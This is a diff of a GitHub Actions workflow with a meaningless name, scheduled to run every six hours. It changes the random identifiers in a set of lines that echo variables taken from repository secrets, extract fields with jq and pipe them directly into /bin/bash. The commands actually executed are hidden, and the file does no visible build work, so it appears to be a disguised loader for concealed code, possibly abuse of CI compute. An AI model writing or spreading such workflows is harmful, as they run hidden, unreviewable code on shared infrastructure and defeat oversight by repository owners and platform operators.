@@ -1,27 +1,24 @@
 name: uooinhak
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
-jobs:  # 6846
+    - cron: '44 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: uooinhak
         env:
-          zyrw159: ${{ secrets.zyrw159 }}
+          a0: ${{ secrets.a0 }}
         run: |
-          echo $zyrw159 | jq -r .soqza4901 | /bin/bash
-          echo $jyb65 | jq -r .apts5 | /bin/bash
-          echo $ixnx830 | jq -r .zt5721 | /bin/bash
-          echo $v4 | jq -r .adn43930 | /bin/bash
-          echo $hlftf60 | jq -r .gjila799 | /bin/bash
-          echo $faqyt64 | jq -r .bqqke11 | /bin/bash
-          echo $l13994 | jq -r .o265 | /bin/bash
-          echo $e03 | jq -r .qy98505 | /bin/bash
-          echo $ncx37 | jq -r .lcoa7 | /bin/bash
-          echo $hfj8690 | jq -r .bcc5844 | /bin/bash
-          echo $h404 | jq -r .jfp74 | /bin/bash
-          echo $evcco565 | jq -r .ldpgt70 | /bin/bash
+          echo $a0 | jq -r .r546 | /bin/bash
+          echo $v17938 | jq -r .ve58115 | /bin/bash
+          echo $gegpk51 | jq -r .pcvl177 | /bin/bash
+          echo $kg0 | jq -r .ywlfa20 | /bin/bash
+          echo $wotep5458 | jq -r .x6 | /bin/bash
+          echo $br3 | jq -r .a65261 | /bin/bash
+          echo $bro07240 | jq -r .bmxwf652 | /bin/bash
+          echo $aka35106 | jq -r .kwe338 | /bin/bash
 
